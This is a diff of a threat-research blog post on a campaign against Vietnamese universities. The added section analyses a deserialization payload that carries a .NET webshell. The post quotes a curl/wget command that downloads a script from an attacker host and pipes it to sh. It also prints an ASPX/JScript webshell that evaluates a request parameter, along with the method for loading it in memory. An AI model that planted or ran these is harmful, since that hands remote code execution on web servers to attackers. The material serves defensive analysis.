@@ -6,7 +6,7 @@ header:
 ribbon: black
 description: "Chinese threat actor targets Vietnemse universities in extensive campaign."
 categories:
-  - CTF Writeup
+  - Threat Research
 tags:
   - Threat Research
   - Malware Analysis
@@ -520,7 +520,7 @@ Aside from using Cobalt Strike for C2, the adversary has heavily leveraged `VShe
 
 From the file `/vshell/v_windows_amd64/db/data.db` we were able to uncover the full list of the VShell victims. Unlike the CobaltStrike C2, the VShell beacons were reaching straight out to the C2 server, and we were able to recover real victim IP addresses. Additionally, we can see the threat actor had “named” the various victims by their domain name. This made attributing victims incredibly easily. 
 
-Thankfully for us, we were able to access the VShell dashboard for further intelligence:
+Thankfully for us, using the same emulation method used for Cobalt Strike, we were able to access the VShell dashboard for further intelligence:
 
 [![2](/assets/images/china/vshell.png)](/assets/images/china/vshell.png){: .full}
 
@@ -583,8 +583,65 @@ We can see this second stage will enumerate the operating systems architecture a
 ```
 (curl -fsSL -m180 hxxp://microsoft-symantec[.]art:8848/slt||wget -T180 -q http://microsoft-symantec.art:8848/slt)|sh
 ```
+* We can see this uses `curl` or `wget` to downloaded the payload `hxxp://microsoft-symantec[.]art:8848/slt` and execute it with `sh`.
+
+# Webshells / Backdoors
+
+## test.resources
+
+### Stage 1
+
+We managed to recover evidence that the threat actor delivered a payload, `test.resources`, to a compromised web-server. 
+
+[![2](/assets/images/china/test.resources_stage2.png)](/assets/images/china/test.resources_stage2.png){: .full}
+
+Viewing the above serialized object file, `test.resources`, we can see it contains additional code, that would be executed within memory on deserialization, that is currently Base64 encoded and Gzip compressed.
+
+We can use [this](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()) CyberChef receipe to base64 decode and gunzip, giving us a `MZ` header, indicating we have an executable. 
+
+[![2](/assets/images/china/decode.png)](/assets/images/china/decode.png){: .full}
+
+### Stage 2 (Web-shell)
+
+We can do some initial triage and see this is a .NET binary!
+
+[![2](/assets/images/china/webshell_die.png)](/assets/images/china/webshell_die.png){: .full}
+
+This means we can open it up in `dnSpy` and recover the full plain-text source code!
+
+[![2](/assets/images/china/webshell_dnspy.png)](/assets/images/china/webshell_dnspy.png){: .full}
+
+Without going through all the source code, let's break this down:
+
+```cs
+//[...REDACTED...]
+string text = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JVJlc3BvbnNlLldyaXRlKGV2YWwoUmVxdWVzdC5JdGVtWyJ6MTExIl0sInVuc2FmZSIpKTslPg==";
+string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text));
+//[...REDACTED...]
+```
+
+We can see some interesting Base64 encoded text that when decoded is set to the variable `@string`. We can see this has the below contents:
+
+```js
+<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z111"],"unsafe"));%>
+```
+
+The above is a extremely minimal webshell, it takes a HTTP parameter `z111`, then passes it to the `eval()` function - allowing direct JScript execution on the web server. 
+
+We can see in order to execute the JScript/.aspx, the code creates a virtual path `/<current-dir>/fakepath31337`:
+
+```cs
+string text5 = "/<current-directory>/fakepath31337/";
+```
+
+With this `text5` variable initialized, the function `HostingEnvironment.RegisterVirtualPathProvider()` is called to provide the file content and file path. This won't be written to disk, it'll be ran dynamically in memory. 
 
 * We can see this uses `curl` or `wget` to downloaded the payload `hxxp://microsoft-symantec[.]art:8848/slt` and execute it with `sh`.
+```cs
+var samplePathProvider = new SamplePathProvider(text5, fileContent);
+//[...REDACTED..]
+HostingEnvironment.RegisterVirtualPathProvider(samplePathProvider);
+```
 
 ## VShell - Plugins
 
